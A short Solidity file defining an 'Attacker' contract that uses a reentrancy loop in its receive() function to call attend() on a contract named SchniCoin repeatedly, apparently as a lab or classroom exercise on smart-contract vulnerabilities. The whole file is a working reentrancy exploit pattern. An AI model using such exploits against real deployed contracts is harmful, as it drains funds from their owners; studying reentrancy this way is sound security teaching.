// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./SchniCoin.sol";

contract Attacker
{
    address owner;
    SchniCoin target;

    constructor(address _target) 
    {
        owner = msg.sender;
        target = SchniCoin(_target);
    }

    function attack() external payable
    {
        require(msg.value == 1 ether);
        target.attend{value: 1 ether}();
        target.getGrade();
    }   

    receive() external payable
    {
        //here we reenter the target contract
        if (target.getBalance(address(this)) < 30) {
            target.attend{value: 1 ether}();
        }
    }
}